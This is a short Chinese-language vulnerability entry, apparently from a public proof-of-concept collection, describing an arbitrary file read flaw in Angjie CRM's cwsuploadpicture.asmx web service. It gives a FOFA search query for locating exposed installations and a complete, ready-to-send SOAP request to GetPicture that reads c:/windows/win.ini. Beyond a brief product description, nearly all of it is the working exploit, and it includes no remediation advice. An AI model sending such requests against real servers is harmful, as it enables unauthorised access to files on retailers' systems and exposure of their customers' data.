# 昂捷CRM cwsuploadpicture存在任意文件读取漏洞

# 一、漏洞简介
昂捷CRM (Customer Relationship Management) 是深圳市昂捷信息技术股份有限公司提供的一款专注于零售行业客户关系管理的系统。旨在帮助零售企业更好地管理客户、提升客户满意度和忠诚度，从而推动业务增长，该系统集成了客户信息管理、会员营销、客户服务等多个功能模块，为零售企业提供全方位的客户关系管理解决方案。昂捷CRM cwsuploadpicture存在任意文件读取漏洞

# 二、影响版本
```plain
昂捷CRM 
```

# <font style="color:rgb(51, 51, 51);">三、资产测绘</font>
+ fofa`body="/ClientBin/slEnjoy.App.xap"`
+ 特征


# 四、漏洞复现
```plain
POST /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetPicture"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetPicture xmlns="http://tempuri.org/">
      <sFullFileName>c:/windows/win.ini</sFullFileName>
    </GetPicture>
  </soap:Body>
</soap:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kyistvq4bcnt1rdb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
